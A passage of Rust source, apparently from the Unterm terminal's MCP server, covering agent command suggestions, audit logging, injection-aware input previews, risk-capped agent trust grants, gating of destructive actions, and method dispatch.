                    let elapsed = now.signed_duration_since(created.with_timezone(&chrono::Local));
                    elapsed.num_milliseconds() as u64 > s.ttl_ms
                })
                .unwrap_or(false)
        };
        if expired {
            if let Some(s) = state.suggestions.get_mut(&id) {
                s.state = SuggestionState::Expired {
                    at: now.to_rfc3339(),
                };
            }
        }
    }
    let mut out: Vec<Suggestion> = state
        .suggestions
        .values()
        .filter(|s| s.pane_id == pane_id && matches!(s.state, SuggestionState::Pending))
        .cloned()
        .collect();
    out.sort_by(|a, b| a.created_at.cmp(&b.created_at));
    out
}

/// Mark a suggestion as accepted and return the text the caller (the
/// suggest UI) should write to the pane's PTY. `run_immediately = true`
/// means the user hit `Alt+Enter`, so the UI is expected to append
/// `\n` after writing the text. Audit is stamped here so the lifecycle
/// trail captures *who accepted* (the user — represented as
/// `agent="user"`), distinct from *who posted* (the agent label
/// frozen on the suggestion when it was created).
pub fn accept_suggestion(id: &str, run_immediately: bool) -> Result<String, String> {
    let mut state = mcp_state().lock();
    let suggestion = state
        .suggestions
        .get_mut(id)
        .ok_or_else(|| format!("unknown suggestion_id: {id}"))?;
    if !matches!(suggestion.state, SuggestionState::Pending) {
        return Err(format!("suggestion {id} is not pending"));
    }
    let text = suggestion.text.clone();
    let posted_by = suggestion.posted_by_agent.clone();
    let pane_id = suggestion.pane_id;
    suggestion.state = SuggestionState::Accepted {
        at: chrono::Local::now().to_rfc3339(),
        ran_immediately: run_immediately,
    };
    // Drop the lock before audit — `audit()` re-acquires it.
    drop(state);
    let entry = AuditEntry {
        timestamp: chrono::Local::now().to_rfc3339(),
        method: "session.suggest.accept".to_string(),
        session_id: Some(pane_id.to_string()),
        detail: format!(
            "id={} posted_by={} run={} {}",
            id,
            posted_by,
            run_immediately,
            input_preview(&text)
        ),
        allowed: true,
        outcome: "executed".to_string(),
        agent: "user".to_string(),
    };
    let mut state = mcp_state().lock();
    state.audit_log.push(entry);
    Ok(text)
}

/// Mark a suggestion dismissed. Symmetric with `accept_suggestion` —
/// the UI calls this when the user hits Esc (or clicks the dismiss
/// affordance). Returns an error if the id is unknown or already
/// resolved.
pub fn dismiss_suggestion(id: &str) -> Result<(), String> {
    let mut state = mcp_state().lock();
    let suggestion = state
        .suggestions
        .get_mut(id)
        .ok_or_else(|| format!("unknown suggestion_id: {id}"))?;
    if !matches!(suggestion.state, SuggestionState::Pending) {
        return Err(format!("suggestion {id} is not pending"));
    }
    let pane_id = suggestion.pane_id;
    let posted_by = suggestion.posted_by_agent.clone();
    suggestion.state = SuggestionState::Dismissed {
        at: chrono::Local::now().to_rfc3339(),
    };
    drop(state);
    let entry = AuditEntry {
        timestamp: chrono::Local::now().to_rfc3339(),
        method: "session.suggest.dismiss".to_string(),
        session_id: Some(pane_id.to_string()),
        detail: format!("id={} posted_by={}", id, posted_by),
        allowed: true,
        outcome: "executed".to_string(),
        agent: "user".to_string(),
    };
    mcp_state().lock().audit_log.push(entry);
    Ok(())
}

/// Render an `input` payload as a single-line audit-friendly summary.
/// Truncates to MAX_LEN graphemes, escapes ASCII control chars, and tags
/// whether the original contained any non-printable bytes — so log
/// readers can spot `\x03` (Ctrl-C) injection without us dumping every
/// raw keystroke (which could include passwords).
/// Public so the front end's banner tests can build their fixtures from the
/// real thing. The defect that made this public: the banner tests passed a
/// bare command as the "preview" and asserted it survived truncation, while
/// production prefixed a byte count that pushed the command off the row.
/// A test that cannot see the production shape cannot catch that.
pub fn input_preview(input: &str) -> String {
    const MAX_LEN: usize = 80;
    let total_len = input.len();
    let mut has_ctrl = false;
    // A line terminator with more text behind it is the injection shape: the
    // reader approves what they can see, and the shell runs a second command
    // they never read. A *trailing* newline is just how you submit a line, so
    // flagging that would be noise -- and noise in a security prompt trains
    // people to click through it.
    let mut newline_seen = false;
    let mut rendered = String::with_capacity(input.len().min(MAX_LEN * 4) + 16);
    for c in input.chars() {
        if c == '\n' || c == '\r' || c == '\t' {
            // Keep whitespace visible but readable.
            match c {
                '\n' => {
                    newline_seen = true;
                    rendered.push_str("\\n");
                }
                '\r' => {
                    newline_seen = true;
                    rendered.push_str("\\r");
                }
                '\t' => rendered.push_str("\\t"),
                _ => {}
            }
        } else if c.is_control() {
            has_ctrl = true;
            rendered.push_str(&format!("\\x{:02x}", c as u32));
        } else {
            if newline_seen && !c.is_whitespace() {
                has_ctrl = true;
            }
            rendered.push(c);
        }
        if rendered.chars().count() >= MAX_LEN {
            rendered.push('…');
            break;
        }
    }
    // Order matters, because the confirmation banner truncates this from the
    // right to fit one row: whatever leads survives. The command is the only
    // part someone can make a trust decision from, so it leads, and the byte
    // count -- interesting in the audit log, useless when deciding -- goes
    // last where it is cut first. `[ctrl]` stays in front of the command
    // despite that rule: invisible control bytes are the case where the
    // visible text is precisely what you must not trust.
    format!(
        "{}{}{}",
        if has_ctrl { "[ctrl] " } else { "" },
        rendered,
        if total_len > 0 {
            format!(" ({total_len} bytes)")
        } else {
            String::new()
        }
    )
}

/// Path of the persistent trust list. Trust state survives Unterm
/// restarts so the user doesn't have to Alt+A their preferred agent
/// once per session.
fn trusted_agents_path() -> std::path::PathBuf {
    unterm_protocol::state_path("trusted_agents.json")
        .unwrap_or_else(|| std::path::PathBuf::from(".unterm").join("trusted_agents.json"))
}

/// Load the persisted trust list. Schema:
///   { "agents": ["claude-code", "cursor", ...] }
/// Missing file / unreadable file / bad JSON → empty list. Silent
/// degradation is correct here: the worst case is the user has to
/// Alt+A again, which is one keystroke.
fn load_persisted_trusted() -> std::collections::HashSet<String> {
    let Ok(text) = std::fs::read_to_string(trusted_agents_path()) else {
        return std::collections::HashSet::new();
    };
    let Ok(value) = serde_json::from_str::<Value>(&text) else {
        return std::collections::HashSet::new();
    };
    value
        .get("agents")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default()
}

/// Atomic write of the trust list. Tempfile + rename so a concurrent
/// reader sees either the old set or the new set, never half-written.
/// Errors logged but not propagated: a missing rename succeeds for
/// the in-memory state, which is what matters for the current
/// session — the next restart just won't remember.

/// Record "always allow this agent" as a durable grant.
///
/// `ceiling` is the risk of the action the user was actually looking at.
/// Answering "always" on a terminal write grants writes; answering it on a
/// destructive action is what grants destruction. The two are different
/// promises and the store keeps them apart.
fn grant_agent_trust(agent: &str, ceiling: &str) {
    // "Always allow" is a promise this can only keep below the top three.
    // Secrets, money and destruction are answered one call at a time by
    // contract, so a standing grant carrying that ceiling would be written,
    // listed in the settings page, and never once answer anything -- with the
    // user having been told they gave it. Capped rather than refused: the
    // agent keeps the standing trust as far as it is allowed to reach, and
    // the bands above it go on asking, which is what the user would have been
    // agreeing to if the banner had been able to say so.
    let ceiling = if unterm_tasks::risk_allows_standing_grant(ceiling) {
        ceiling
    } else {
        log::info!(
            "'always allow' for {agent} capped at external_side_effect: \
             {ceiling} is answered one call at a time"
        );
        "external_side_effect"
    };
    let Some(store) = unterm_services::cockpit::fleet_store::tasks() else {
        log::warn!("no task store: 'always allow' for {agent} will not survive a restart");
        return;
    };
    if let Err(error) = store.create_grant(unterm_tasks::NewGrant {
        scope_or_once: Some(unterm_tasks::Scope::Always),
        actor: Some(agent.to_string()),
        max_risk: Some(ceiling.to_string()),
        ..Default::default()
    }) {
        log::warn!("could not record trust for {agent}: {error:#}");
    }
}

/// Whether a standing grant already covers this agent at this risk.
fn agent_is_granted(agent: &str, method: &str, risk: &str) -> bool {
    let Some(store) = unterm_services::cockpit::fleet_store::tasks() else {
        return false;
    };
    store
        .covering_grant(&unterm_tasks::Ask {
            method: method.to_string(),
            actor: Some(agent.to_string()),
            risk_rank: unterm_tasks::approval::risk_rank(risk),
            ..Default::default()
        })
        .ok()
        .flatten()
        .is_some()
}

/// Bring `trusted_agents.json` across, once.
///
/// Every agent in it was trusted by clicking "always allow" on a terminal
/// write, so each becomes a grant with that ceiling — not a blanket one. The
/// file is renamed rather than deleted: it is the only record of who was
/// trusted and when, and a migration that eats its input cannot be checked.
pub fn migrate_trusted_agents_to_grants() -> usize {
    let path = trusted_agents_path();
    if !path.exists() {
        return 0;
    }
    let agents = load_persisted_trusted();
    for agent in &agents {
        if !agent_is_granted(agent, "session.input", "local_mutation") {
            grant_agent_trust(agent, "local_mutation");
        }
    }
    let retired = path.with_extension("json.migrated");
    if std::fs::rename(&path, &retired).is_ok() && !agents.is_empty() {
        log::info!(
            "imported {} trusted agent(s) from {} as grants",
            agents.len(),
            path.display()
        );
    }
    agents.len()
}

fn save_persisted_trusted(agents: &std::collections::HashSet<String>) {
    let path = trusted_agents_path();
    if let Some(parent) = path.parent() {
        if let Err(e) = std::fs::create_dir_all(parent) {
            log::warn!("save trusted_agents.json: create_dir_all: {e:#}");
            return;
        }
    }
    let mut sorted: Vec<&String> = agents.iter().collect();
    sorted.sort();
    let body = json!({ "agents": sorted });
    let pretty = match serde_json::to_string_pretty(&body) {
        Ok(s) => s,
        Err(e) => {
            log::warn!("save trusted_agents.json: serialize: {e:#}");
            return;
        }
    };
    let tmp = path.with_extension("json.tmp");
    if let Err(e) = std::fs::write(&tmp, pretty) {
        log::warn!("save trusted_agents.json: write temp: {e:#}");
        return;
    }
    if let Err(e) = std::fs::rename(&tmp, &path) {
        log::warn!("save trusted_agents.json: rename: {e:#}");
    }
}

fn mcp_state() -> &'static Mutex<McpState> {
    static STATE: std::sync::OnceLock<Mutex<McpState>> = std::sync::OnceLock::new();
    STATE.get_or_init(|| {
        // Load persisted trust at startup so the user's choice from
        // last session survives. confirmed_agents is the merged set
        // (persisted + this-session-Alt+A); save_persisted_trusted
        // re-snapshots the whole thing on every mutation.
        let confirmed_agents = load_persisted_trusted();
        // The ring starts where the last run left off: an audit trail that
        // forgets everything on restart is not a trail. Capacity-bounded by
        // the same setting the ring enforces on push.
        let backfill = unterm_services::settings::current()
            .mcp_audit_log_capacity
            .max(16);
        let audit_log: Vec<AuditEntry> = unterm_services::audit_store::recent(backfill)
            .into_iter()
            .filter_map(|line| serde_json::from_value(line).ok())
            .collect();
        Mutex::new(McpState {
            audit_log,
            policy: CommandPolicy::default(),
            proxy: load_proxy_settings(),
            launch_env_overlay: HashMap::new(),
            input_event_count: 0,
            last_input_at: None,
            agents_by_connection: HashMap::new(),
            clients_by_connection: HashMap::new(),
            known_agents: HashMap::new(),
            pane_agents: HashMap::new(),
            agents_with_input_history: std::collections::HashSet::new(),
            confirmed_agents,
            pending_confirmations: Vec::new(),
            confirmation_seq: 0,
            suggestions: HashMap::new(),
            suggestion_order: Vec::new(),
            suggestion_seq: 0,
        })
    })
}

pub struct McpHandler;

fn selftest_limited_without_window(err: anyhow::Error) -> Value {
    let reason = err.to_string();
    if reason.contains("no Unterm window is attached") {
        json!({
            "ok": true,
            "limited": true,
            "reason": reason,
        })
    } else {
        json!({
            "ok": false,
            "error": reason,
        })
    }
}

impl McpHandler {
    pub fn new() -> Self {
        Self
    }

    pub fn register_client(&self, conn_id: u64, client: unterm_protocol::BuildHandshake) {
        mcp_state()
            .lock()
            .clients_by_connection
            .insert(conn_id, client);
    }

    pub fn handle(&self, ctx: &ConnectionContext, method: &str, params: &Value) -> Result<Value> {
        CURRENT_CONN_ID.with(|cell| *cell.borrow_mut() = Some(ctx.conn_id));
        AUDIT_WRITTEN_THIS_CALL.with(|cell| cell.set(false));
        let _scope = ConnectionScope;
        // Irreversible actions are asked about once, here, rather than in
        // each method. Destroying a session, cleaning a fleet or discarding a
        // review used to happen with no question at all, while echoing a
        // word into a pane raised a banner — because the write gate asked
        // "is this typing?" and nothing asked "can this be undone?".
        //
        // Central on purpose: a per-method check is one somebody forgets to
        // add to the next destructive method, and the failure is silent.
        if let Err(refusal) = self.gate_destructive(method) {
            return Err(refusal);
        }
        let result = match method {
            // Agent self-identification — call this right after
            // `auth.login` to tag your connection so audit entries
            // group by agent name instead of by connection ID.
            "agent.identify" => self.agent_identify(ctx, params),
            "agent.whoami" => self.agent_whoami(ctx),
            "agent.list_trusted" => Ok(crate::handler::trust_snapshot()),
            "agent.trust" => self.agent_trust(params),
            "agent.untrust" => self.agent_untrust(params),
            // Cockpit — agent state per pane, hook ingestion, inbox.
            "agent.status" => self.cockpit_agent_status(params),
            "agent.signal" => self.cockpit_agent_signal(ctx, params),
            "cockpit.inbox" => self.cockpit_inbox(),
            // Cockpit — fleets and review.
            "fleet.launch" => self.fleet_launch(params),
            "fleet.list" => {
                Ok(json!({ "fleets": unterm_services::cockpit::review::overview()["fleets"] }))
            }
            "fleet.clean" => self.fleet_clean(params),
            "fleet.retry" => self.fleet_retry(params),
            "review.list" => Ok(unterm_services::cockpit::verification::enrich_overview(
                unterm_services::cockpit::observability::enrich_overview(
                    unterm_services::cockpit::review::overview(),
                ),
            )),
            "review.diff" => self.review_diff(params),
            "review.verify" => self.review_verify(params),
            "review.rollback" => self.review_rollback(params),
            "review.merge" => self.review_merge(params),
            "review.discard" => self.review_discard(params),
            "ghost.debug" => self.ghost_debug(params),
            // Suggest API — agents propose text; the user decides
            // whether it reaches the PTY (Tab/Esc in the suggest UI).
            "session.suggest" => self.session_suggest(ctx, params),
            "session.suggest_status" => self.session_suggest_status(params),
            "session.suggest_cancel" => self.session_suggest_cancel(params),
            "session.suggest_list" => self.session_suggest_list(params),
            // Session management
            "session.list" => self.session_list(),
            "session.get" | "session.status" => self.session_get(params),
            "session.create" => self.session_create(params),
            "session.split" => self.session_split(params),
            "session.focus" => self.session_focus(params),
            "session.input" => self.session_input(params),
            "session.paste" => self.session_paste(params),
            "session.resize" => self.session_resize(params),
            "session.destroy" => self.session_destroy(params),
            "session.idle" => self.session_idle(params),
            "session.cwd" => self.session_cwd(params),
            "session.env" => self.session_env(params),
            "session.set_env" => self.session_set_env(params),
            "session.history" => self.session_history(params),
            "session.audit_log" => self.session_audit_log(params),
            // Exec
            "exec.run" => self.exec_run(params),
            "exec.send" => self.exec_send(params),
            "exec.run_wait" => self.exec_run_wait(params),
            "exec.status" => self.exec_status(params),
            "exec.cancel" => self.exec_cancel(params),
            // Screen
            "screen.read" => self.screen_read(params),
            "screen.text" => self.screen_text(params),
            // Full scrollback + viewport as text. AI-friendly alternative to a
            // rendered "long screenshot" — for long terminal output you want
            // to hand off to an LLM, this is strictly better than a PNG
            // (parses natively, no OCR, no font fidelity loss). Pass
            // `escapes: true` to preserve ANSI styling, otherwise plain text.
            "screen.scrollback_text" => self.screen_scrollback_text(params),
            "screen.cursor" => self.screen_cursor(params),
            "screen.scroll" => self.screen_scroll(params),
            "screen.clear" => self.screen_clear(params),
            "screen.search" => self.screen_search(params),
            "screen.detect_errors" => self.screen_detect_errors(params),
            // Signal
            "signal.send" => self.signal_send(params),
            // Orchestrate
            "orchestrate.launch" => self.orchestrate_launch(params),
            "orchestrate.broadcast" => self.orchestrate_broadcast(params),
            "orchestrate.wait" => self.orchestrate_wait(params),
            // Proxy
            "proxy.status" => self.proxy_status(),
            "proxy.nodes" => self.proxy_nodes(),
            "proxy.switch" => self.proxy_switch(params),
            "proxy.speedtest" => self.proxy_speedtest(params),
            "proxy.configure" => self.proxy_configure(params),
            "proxy.disable" => self.proxy_disable(),
            "proxy.env" => self.proxy_env(),
            "proxy.rotation" => self.proxy_rotation(params),
            "proxy.set_nodes" => self.proxy_set_nodes(params),
            "proxy.clash_status" => self.proxy_clash_status(),
            "proxy.clash_select" => self.proxy_clash_select(params),
            "proxy.clash_set_controller" => self.proxy_clash_set_controller(params),
            // Workspace
            "workspace.save" => self.workspace_save(params),
            "workspace.restore" => self.workspace_restore(params),
            "workspace.list" => self.workspace_list(),
            // Capture
            "capture.screen" => self.capture_screen(params),
            "capture.window" => self.capture_window(params),
            "capture.select" => self.capture_select(params),
            "capture.clipboard" => self.capture_clipboard(),
            "capture.scrollback" => self.capture_scrollback(params),
            "capture.window_scroll" => self.capture_window_scroll(params),
            // Upload to user-configured object storage. Credentials live in
            // ~/.unterm/upload.json (OSS / COS / Qiniu) and never leave the
            // local machine. Pairs with `capture.*` so an AI agent can
            // screenshot → upload → embed the URL without dragging files.
            "upload.file" => crate::upload::upload(params),
            // Policy
            "policy.set" => self.policy_set(params),
            "policy.check" => self.policy_check(params),
            // System
            "system.info" => self.system_info(),
            "system.launch_admin" => self.system_launch_admin(params),
            "server.info" => self.server_info(),
            "server.health" => self.server_health(),
            "server.capabilities" => self.server_capabilities(),
            // Single-call discovery surface for AI agents and the Web Settings
            // "Reference" tab: MCP methods + CLI subcommands + live keybindings
            // in one round trip. See `meta.rs` for the source of truth list.
            // Approvals — who may answer is decided inside.
            method if crate::approvals::handles(method) => {
                crate::approvals::dispatch(ctx, method, params)
            }
            // Providers
            method if crate::providers::handles(method) => {
                crate::providers::dispatch(method, params)
            }
            // Workspaces, artifacts, the audit chain, evidence bundles
            method if crate::records::handles(method) => {
                crate::records::dispatch_with(self, ctx, method, params)
            }
            "meta.surface" => crate::meta::surface(params),
            // Multi-instance discovery (one Unterm process = one instance,
            // each with a NATO-phonetic name like "alpha", "bravo", ...)
            "instance.list" => self.instance_list(),
            "instance.info" => self.instance_info(),
            "instance.lifecycle" => self.instance_lifecycle(),
            "instance.close" => self.instance_close(params),
            "instance.set_title" => self.instance_set_title(params),
            "instance.focus" => self.instance_focus(params),
            "instance.new_window" => self.instance_new_window(params),
            "instance.windows" => self.instance_windows(),
            // Identity profiles: read-only surface for agents. Writes
            // (create / set-secret / delete) and `profile.spawn` (which
            // would have to open a new GUI window) are intentionally
            // CLI-only — that keeps the agent-facing surface narrow
            // and means no plausible MCP call can write to keychain.
            "profile.list" => self.profile_list(),
            "profile.current" => self.profile_current(),
            "profile.audit" => self.profile_audit(),
            "selftest.run" => self.selftest_run(params),
            // Session recording
            "session.recording_start" => self.session_recording_start(params),
            "session.recording_stop" => self.session_recording_stop(params),
            "session.recording_status" => self.session_recording_status(params),
            "session.recording_list" => self.session_recording_list(params),
            "session.recording_read" => self.session_recording_read(params),
            "session.recording_attach_trace" => self.session_recording_attach_trace(params),
            "session.export_markdown" => self.session_export_markdown(params),
            _ => Err(anyhow!("Unknown method: {}", method)),
        };
        if method_is_mutating(method) && !AUDIT_WRITTEN_THIS_CALL.with(std::cell::Cell::get) {
            let pane_id = Self::pane_id_param(params)
                .ok()
                .flatten()
                .map(|id| id.to_string());
            let detail = match &result {
                Ok(_) => "completed".to_string(),
                Err(err) => format!("failed: {err}"),
            };
            self.audit(method, pane_id.as_deref(), &detail);
        }
        result
    }

    /// The engine this surface talks to.
    ///
    /// Asked of the installed provider rather than chosen here: which engines
    /// exist is the front end's business, and the two that do choose
    /// differently.
    fn engine(&self) -> Box<dyn unterm_engine::HostEngine> {
        match unterm_engine::engine_provider() {
            Some(provider) => provider(),
            // Before a front end installs one, next-core is the only engine
            // that can answer without a window.
            None => Box::new(unterm_engine::next_core::NextCoreEngine),
        }
    }

    fn engine_label(&self) -> String {
        format!("Unterm ({})", self.engine().name())
    }

    fn pane_id_from_params(params: &Value) -> Result<usize> {
        Self::pane_id_param(params)?
            .ok_or_else(|| anyhow!("Missing 'id' / 'session_id' / 'pane_id' parameter"))
    }

    fn pane_id_param(params: &Value) -> Result<Option<usize>> {
        let id_val = params
            .get("id")
            .or_else(|| params.get("session_id"))
            .or_else(|| params.get("pane_id"));
        match id_val {
            Some(v) if v.is_u64() => Ok(Some(v.as_u64().unwrap() as usize)),
            Some(v) if v.is_string() => v
                .as_str()
                .unwrap()
                .parse::<usize>()
                .map(Some)
                .map_err(|_| anyhow!("Invalid session_id: {}", v)),
            Some(v) => Err(anyhow!("Invalid session_id: {}", v)),
            None => Ok(None),
        }
    }

    fn resolve_pane_id(
        &self,
        engine: &dyn unterm_engine::HostEngine,
        params: &Value,
        options: PaneResolutionOptions,
    ) -> Result<usize> {
        if let Some(pane_id) = Self::pane_id_param(params)? {
            if options.validate_session {
                match engine.get_session(pane_id) {
                    Ok(_) => {}
                    Err(_) if options.fallback_on_invalid_explicit => {
                        return Self::resolve_active_pane_id(engine, options);
                    }
                    Err(err) => {
                        return Err(err).with_context(|| format!("resolve pane {pane_id}"));
                    }
                }
            }
            return Ok(pane_id);
        }

        if !options.active_fallback {
            return Err(anyhow!("Missing 'id' / 'session_id' / 'pane_id' parameter"));
        }

        Self::resolve_active_pane_id(engine, options)
    }

    fn resolve_active_pane_id(
        engine: &dyn unterm_engine::HostEngine,
        options: PaneResolutionOptions,
    ) -> Result<usize> {
        let pane_id = engine
            .active_pane_id()?
            .ok_or_else(|| anyhow!("no active pane available"))? as usize;
        if options.validate_session {
            engine
                .get_session(pane_id)
                .with_context(|| format!("resolve active pane {pane_id}"))?;
        }
        Ok(pane_id)
    }

    fn server_info(&self) -> Result<Value> {
        let instance = unterm_services::server_info::read_current();
        let has_instance = !instance.id.is_empty();
        let window = unterm_engine::window_identity();
        let mut build = instance.build_handshake();
        if build.product_version.is_empty() {
            if let Some(core_build) = core_discovery_build() {
                build = core_build;
            } else {
                // No instance record to speak for us: a headless Core
                // serves MCP without registering as a GUI instance. The
                // process still knows exactly what it is, and a client
                // that validates identity must not read silence as an
                // incompatible peer.
                build = unterm_protocol::BuildHandshake::current(
                    unterm_protocol::ProcessRole::Core,
                    std::process::id(),
                    chrono::Utc::now().to_rfc3339(),
                );
            }
        }
        let lifecycle = if has_instance {
            instance_lifecycle_snapshot(&instance, true)
        } else {
            lifecycle_snapshot_for_pid(build.pid, true)
        };
        Ok(json!({
            "name": "Unterm MCP Server",
            "version": build.product_version,
            "build": build,
            "engine": self.engine_label(),
            "window_engine": window.engine,
            "uses_host_window": window.uses_host_window,
            "lifecycle": lifecycle,
            "protocol": "json-rpc-2.0",
        }))
    }

    fn server_health(&self) -> Result<Value> {
        let engine = self.engine();
        let engine_health = engine.health()?;
        let config = unterm_services::settings::current();
        let instance = unterm_services::server_info::read_current();
        let status = engine_health.status.clone();
        let engine_name = engine_health.engine.clone();
        let engine_ready = engine_health.ready;
        let pane_count = engine_health.pane_count.unwrap_or_default();

        Ok(json!({
            "status": status,
            "engine": format!("Unterm ({})", engine_name),
            "engine_health": engine_health,
            "mcp": {
                "bind": "127.0.0.1",
                "port": instance.mcp_port,
                "auth": "token",
                "input_confirmation": pty_write_confirmation_snapshot(),
            },
            "mux": {
                "available": engine_name == "wezterm" && engine_ready,
                "pane_count": pane_count,
            },
            "terminal": {
                "initial_cols": config.initial_cols,
                "initial_rows": config.initial_rows,
                "color_scheme": config.color_scheme.clone(),
                "term": config.term.clone(),
            },
        }))
    }

    fn server_capabilities(&self) -> Result<Value> {
        // Derive the namespace → methods map from meta::MCP_METHODS so this
        // listing can never drift from what dispatch actually accepts.
        // Kept around for back-compat with agents that already learned to
        // call `server.capabilities`; new agents should prefer `meta.surface`.
        let mut grouped: std::collections::BTreeMap<&'static str, Vec<&'static str>> =
            std::collections::BTreeMap::new();
        for m in crate::meta::MCP_METHODS {
            grouped.entry(m.namespace).or_default().push(m.name);
        }
        let mut value = serde_json::to_value(&grouped)?;
        if let Some(object) = value.as_object_mut() {
            let engine = self.engine().name();
            object.insert("_engine".to_string(), json!(engine));
            object.insert(
                "_engine_capabilities".to_string(),
                crate::meta::engine_capabilities(engine),
            );
        }
        Ok(value)
    }

    /// Enumerate every live Unterm instance on this machine. An "instance"
    /// is a single Unterm process; each owns a NATO-phonetic name (alpha,
    /// bravo, …) recorded in `~/.unterm/instances/<name>.json`. Stale
    /// files (PID dead) are filtered out by the storage layer.
    ///
    /// AI agents use this when driving multiple Unterm windows: list
    /// instances, pick one by cwd / title / start order, then connect
    /// to that instance's `mcp_port` with its `auth_token` directly.
    fn instance_list(&self) -> Result<Value> {
        // Which of these rows is *us*. `read_current()` alone is not enough:
        // it resolves through the id the calling process registered, and
        // since 0.68 this surface lives in the Core, which registers nothing
        // -- the front end does. Asked there it answers None, so every row
        // came back `is_current: false` and the windows below were attached
        // to nobody. Falling back to the active pointer is what
        // `instance.info` next door already does for the same reason.
        let current = unterm_services::server_info::read_current();
        let current_id = if current.id.is_empty() {
            unterm_services::server_info::read().id
        } else {
            current.id
        };
        let current_id = (!current_id.is_empty()).then_some(current_id);
        // Headless there is no front end to be, and the row that is *us* is
        // the Core's own, added below.
        let current_id = current_id.or_else(|| {
            core_self_instance()
                .filter(|core| core.pid == std::process::id())
                .map(|core| core.id)
        });
        let registry = unterm_services::server_info::instance_registry_snapshot();
        let registry_summary = json!({
            "owner": "server_info",
            "active_source": registry.active_source,
            "active_id": registry.active_id,
            "active_pid_alive": registry.active_pid_alive,
            "live_count": registry.live_count,
            "stale_removed": registry.stale_removed,
            "corrupt_files": registry.corrupt_files,
            "empty_files": registry.empty_files,
            "unreadable_files": registry.unreadable_files,
            "values_redacted": true,
        });
        // The windows of the front end this surface is attached to. One
        // record used to mean one window, because a window was a process;
        // since the single-process design a record means a front end and the
        // windows have ids of their own. Only *this* instance can be asked --
        // a peer's windows live behind its own MCP port -- so the key is
        // present on the current entry and absent elsewhere rather than
        // reported as an empty list, which would read as "that instance has
        // no windows" when it means "not from here".
        let windows = self.engine().list_windows().unwrap_or_default();
        let mut live = registry.live;
        // The Core, when no front end on this machine already stands for it.
        //
        // A front end registers with the Core's own port and token, so with a
        // window open the Core is already on the list under that window's
        // name and adding it again would offer two ways to reach one process.
        // With no window there is nothing else to find, and leaving it off is
        // what told an agent talking to a headless Core that no Unterm was
        // running.
        if let Some(core) = core_self_instance() {
            let already_listed = live
                .iter()
                .any(|i| i.mcp_port != 0 && i.mcp_port == core.mcp_port);
            if !already_listed {
                live.push(core);
            }
        }
        let arr: Vec<Value> = live
            .into_iter()
            .map(|i| {
                let is_current = current_id.as_deref() == Some(i.id.as_str());
                let lifecycle = instance_lifecycle_snapshot(&i, is_current);
                let mut entry = json!({
                    "id": i.id,
                    "pid": i.pid,
                    "started_at": i.started_at,
                    "mcp_port": i.mcp_port,
                    "http_port": i.http_port,
                    "title": i.title,
                    "cwd": i.cwd,
                    "version": i.version,
                    "platform": i.platform,
                    "lifecycle": lifecycle,
                });
                if is_current {
                    entry["windows"] = json!(windows);
                }
                entry
            })
            .collect();
        Ok(json!({
            "instances": arr,
            "registry": registry_summary,
        }))
    }

    /// Return *this* instance's own metadata (id, ports, title, cwd).
    /// Helpful for an agent to confirm which instance it's actually
    /// connected to vs. what `instance.list` says.
    fn instance_info(&self) -> Result<Value> {
        let current = unterm_services::server_info::read_current();
        let has_current = !current.id.is_empty();
        let i = if has_current {
            current
        } else {
            let registered = unterm_services::server_info::read();
            // Nothing registered means no front end -- and this surface still
            // belongs to something. It used to answer with a default record:
            // empty id, pid 0, empty version, `pid_alive: false`. "Which
            // Unterm am I connected to" is the one question this method
            // exists to answer, and headless it answered that the connection
            // was to a process that is not alive.
            if registered.id.is_empty() {
                core_self_instance().unwrap_or(registered)
            } else {
                registered
            }
        };
        // A record that names this process is current, whichever way it was
        // found: `has_current` only knows about front-end registration.
        let is_current = has_current || i.pid == std::process::id();
        let lifecycle = instance_lifecycle_snapshot(&i, is_current);
        let window = unterm_engine::window_identity();
        Ok(json!({
            "id": i.id,
            "pid": i.pid,
            "started_at": i.started_at,
            "mcp_port": i.mcp_port,
            "http_port": i.http_port,
            "auth_token": i.auth_token,
            "title": i.title,
            "window": {
                "engine": window.engine,
                "title_owner": "server_info",
                "focus_owner": window.window_owner,
                "uses_host_window": window.uses_host_window,
            },
            "lifecycle": lifecycle,
            "cwd": i.cwd,
            "version": i.version,
            "platform": i.platform,
        }))
    }

    /// Read-only instance lifecycle ownership and shutdown dry-run plan.
    ///
    /// This never closes a window: whether the window is even this process's
    /// to close is the front end's answer, reported here rather than assumed.
    fn instance_lifecycle(&self) -> Result<Value> {
        let window = unterm_engine::window_identity();
        let plan =
            unterm_services::server_info::instance_lifecycle_plan(window.native_window_lifecycle);
        Ok(json!({
            "owner": "server_info",
            "operation": "dry_run",
            "plan": plan,
            "native_window": {
                "owner": window.window_owner,
                "lifecycle": window.native_window_lifecycle,
                "can_close_from_mcp": false,
            },
            "values_redacted": true,
        }))
    }

    /// Protected registry-level close hook. This does not terminate the
    /// process or close the native window; it executes the same registry
    /// unregister path that a future native close lifecycle service will call.
    fn instance_close(&self, params: &Value) -> Result<Value> {
        let window = unterm_engine::window_identity();
        let apply = bool_param(params, "apply").unwrap_or(false);
        let confirmed = params.get("confirm").and_then(|value| value.as_str())
            == Some("unregister-current-instance");

        if !apply {
            return Ok(json!({
                "ok": true,
                "operation": "dry_run",
                "requires_confirm": "unregister-current-instance",
                "plan": unterm_services::server_info::instance_lifecycle_plan(window.native_window_lifecycle).shutdown,
                "native_window": {
                    "owner": window.window_owner,
                    "lifecycle": window.native_window_lifecycle,
                    "closed": false,
                },
                "values_redacted": true,
            }));
        }
        if !confirmed {
            return Err(anyhow!(
                "instance.close apply requires confirm=\"unregister-current-instance\""
            ));
        }

        let result = unterm_services::server_info::unregister_current_instance();
        Ok(json!({
            "ok": result.errors.is_empty(),
            "operation": "apply",
            "result": result,
            "native_window": {
                "owner": window.window_owner,
                "lifecycle": window.native_window_lifecycle,
                "closed": false,
            },
            "values_redacted": true,
        }))
    }

    /// Pin a custom display title for this instance — overrides the
    /// auto-derived `Unterm — <name> — <project>` window title, and
    /// shows up alongside the NATO id in `instance.list` so peers
    /// can route to the right window. Pass `null` (or omit) to
    /// clear the override and resume auto-titling.
    /// Name this instance in the registry.
    ///
    /// Not a window operation despite the name: the title lives in the
    /// instance registry, which is how peers and `instance.list` see it. No
    /// front end's window caption changes, which is why this works with no
    /// front end at all.
    fn instance_set_title(&self, params: &Value) -> Result<Value> {
        let title = params
            .get("title")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
            .filter(|s| !s.is_empty());
        unterm_services::server_info::set_title(title.clone())
            .context("failed to write instance title")?;
